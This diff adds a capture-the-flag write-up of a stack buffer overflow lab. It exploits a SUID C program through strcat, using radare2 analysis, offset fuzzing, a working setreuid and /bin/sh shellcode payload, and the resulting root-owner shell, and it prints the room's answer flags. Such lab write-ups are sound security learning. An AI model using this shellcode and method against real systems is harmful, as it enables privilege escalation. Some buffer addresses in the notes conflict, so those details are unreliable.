@@ -979,3 +979,233 @@ sh-4.2$
 ```
 ### Q1 Flag from secret? 
 Answer: omgyoudidthissocool!!
+
+# Buffer Overflow 2
+
+Files present show a similar situation the file is accessible with by the owner to read  but has the suid bit set. Similar to Task 8.
+```
+overflow-4]$ ls -la
+...
+-rwsr-xr-x 1 user3 user3 8272 Sep  3  2019 buffer-overflow-2
+-rw-rw-r-- 1 user1 user1  250 Sep  3  2019 buffer-overflow-2.c
+-rw------- 1 user3 user3   17 Sep  2  2019 secret.txt
+```
+
+The script we are looking at also used buffer variable, this time 154 bytes.
+
+```
+overflow-4]$ cat buffer-overflow-2.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void concat_arg(char *string)
+{
+    char buffer[154] = "doggo";
+    strcat(buffer, string);
+    printf("new word is %s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    concat_arg(argv[1]);
+}
+[user1@ip-10-49-156-240 overflow-4]$ 
+```
+Using similar approach to Task 8 with radare2:
+```
+overflow-4]$ radare2 -d  buffer-overflow-2
+Process with PID 12958 started...
+= attach 12958 12958
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+ -- Don\u2019t feed the bugs! (except delicious stacktraces)!
+```
+Analyse 
+```
+[0x7ffff7dd9ef0]> aaa
+[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
+Invalid address from 0x00400629
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[TOFIX: aaft can't run in debugger mode.ions (aaft)
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+```
+Set brake point at concat_arg method:
+```
+[0x7ffff7dd9ef0]> db sym.concat_arg
+```
+Run the program with any argument similarly:
+```
+[0x7ffff7dd9ef0]> ood AAAA
+Wait event received by different pid 12958
+Process with PID 12965 started...
+= attach 12965 12965
+File dbg:///home/user1/overflow-4/buffer-overflow-2  AAAA reopened in read-write mode
+12965
+```
+Next dc tells radare2 to continue running the target process until it hits break point
+Now radare2 will stop inside concat_arg:
+```
+[0x7ffff7dd9ef0]> dc
+hit breakpoint at: 400527
+```
+Get the actual stack addresses of locals:
+```
+[0x00400527]> afvd
+arg arg1 =   : rdi : 0x00000000
+var var_a8h = 0x7fffffffe2e8 = (qword)0x0000000000000000
+var var_a0h = 0x7fffffffe2f0 = (qword)0x0000000000000000
+var var_98h = 0x7fffffffe2f8 = (qword)0x0000000000000000
+var var_90h = 0x7fffffffe300 = (qword)0x0000000000000000
+
+```
+Not real clear which is which so a closer look is required.
+
+So in the assembly, the buffer must be whichever stack variable is:
+- the largest
+- used with lea before strcat
+- zero‑initialized
+- filled with “doggo”
+
+These are four 8‑byte slots (qwords).
+- But the buffer is 154 bytes, so it will span multiple of these slots.
+- The compiler does NOT show “buffer” as one variable — it shows the start of the region.
+- The 154‑byte buffer starts at the lowest address, which is:
+  var_90h = rbp - 0x90
+- The entire stack is 0xb0 = 176 bytes
+
+Confirmed Var_90h at 0x00400556 
+```
+lea rdx, [var_90h]   ← load address of buffer
+mov rdi, rdx         ← rdi = buffer
+call strcat
+```
+RIP address from Var_90h in python can be determined with:
+```
+buffer_addr = 0x00007fffffffe300 → 
+rip = buffer_addr.to_bytes(8, 'little')
+rip = b"\x00\xe3\xff\xff\xff\x7f\x00\x00"
+```
+Shell will be similar previous situation so skip and use same one as before with setreuid with a slight change for 1003 instead comppnent included.
+```
+'\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
+```
+
+Still need to fuzz the offset for payload 
+```
+overflow-4]$ ./buffer-overflow-2 $(python -c "print 'A'*154")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+Works until 155 entered so is saved RBP
+```
+overflow-4]$ ./buffer-overflow-2 $(python -c "print 'A'*155")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+A closer to look at RIP, after trial and error
+
+Start after several tries 166, showed A in the address but not completely filled.
+
+```
+overflow-4]$ radare2 -d ./buffer-overflow-2 "$(python -c 'print("A"*166)')"
+...
+[0x7ffff7dd9ef0]> dc
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x00414141 code=1 ret=0
+[0x00414141]> exit
+
+```
+Try 167
+```
+overflow-4]$ radare2 -d ./buffer-overflow-2 "$(python -c 'print("A"*167)')"
+...
+[0x7ffff7dd9ef0]> dc
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
+[0x41414141]> dr rip
+0x41414141
+[0x41414141]> 
+```
+Now in summary what we have:
+offset = 167
+buf_addr = 0x7fffffffe2c0          # var_90h from radare2
+rip = buf_addr.to_bytes(8, 'little')
+
+payload  = b"\x90" * 40            # NOP sled (tune as you like)
+payload += shellcode               # your setreuid + /bin/sh
+payload += b"A" * (offset - len(payload))
+payload += rip
+```
+[0x00400527]> pdf @ sym.concat_arg
+            ;-- rip:
+\u250c 133: sym.concat_arg (int64_t arg1);
+\u2502           ; var int64_t var_a8h @ rbp-0xa8
+\u2502           ; var int64_t var_a0h @ rbp-0xa0
+\u2502           ; var int64_t var_98h @ rbp-0x98
+\u2502           ; var int64_t var_90h @ rbp-0x90
+\u2502           ; arg int64_t arg1 @ rdi
+\u2502           ; CALL XREF from main @ 0x4005c9
+\u2502           0x00400527 b    55             push rbp
+\u2502           0x00400528      4889e5         mov rbp, rsp
+\u2502           0x0040052b      4881ecb00000.  sub rsp, 0xb0
+\u2502           0x00400532      4889bd58ffff.  mov qword [var_a8h], rdi    ; arg1
+\u2502           0x00400539      48b8646f6767.  movabs rax, 0x6f67676f64    ; 'doggo'
+\u2502           0x00400543      ba00000000     mov edx, 0
+\u2502           0x00400548      48898560ffff.  mov qword [var_a0h], rax
+\u2502           0x0040054f      48899568ffff.  mov qword [var_98h], rdx
+\u2502           0x00400556      488d9570ffff.  lea rdx, [var_90h]
+\u2502           0x0040055d      b800000000     mov eax, 0
+\u2502           0x00400562      b911000000     mov ecx, 0x11               ; 17
+\u2502           0x00400567      4889d7         mov rdi, rdx
+\u2502           0x0040056a      f348ab         rep stosq qword [rdi], rax
+\u2502           0x0040056d      4889fa         mov rdx, rdi
+\u2502           0x00400570      668902         mov word [rdx], ax
+\u2502           0x00400573      4883c202       add rdx, 2
+\u2502           0x00400577      488b9558ffff.  mov rdx, qword [var_a8h]
+\u2502           0x0040057e      488d8560ffff.  lea rax, [var_a0h]
+\u2502           0x00400585      4889d6         mov rsi, rdx
+\u2502           0x00400588      4889c7         mov rdi, rax
+\u2502           0x0040058b      e8b0feffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
+\u2502           0x00400590      488d8560ffff.  lea rax, [var_a0h]
+\u2502           0x00400597      4889c6         mov rsi, rax
+\u2502           0x0040059a      bf70064000     mov edi, str.new_word_is__s ; 0x400670 ; "new word is %s\n"
+\u2502           0x0040059f      b800000000     mov eax, 0
+\u2502           0x004005a4      e887feffff     call sym.imp.printf         ; int printf(const char *format)
+\u2502           0x004005a9      90             nop
+\u2502           0x004005aa      c9             leave
+\u2514           0x004005ab      c3             ret
+[0x00400527]> 
+
+```
+Final run:
+```
+overflow-4]$ ./buffer-overflow-2 $(python -c "print(
+> '\x90'*90 +
+> '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' +
+> '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' +
+> '\x90'*19 +
+> '\x68\xe2\xff\xff\xff\x7f'
+> )")
+new word is doggo\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdh\ufffd\ufffd\ufffd\ufffd
+sh-4.2$ id 
+uid=1003(user3) gid=1001(user1) groups=1001(user1)
+sh-4.2$ whoami
+user3
+sh-4.2$ cat secret.txt
+wowanothertime!!
+sh-4.2$ 
+```
+
+
+### Question 1: Use the same method to read the contents of the secret file! Answer: wowanothertime!!
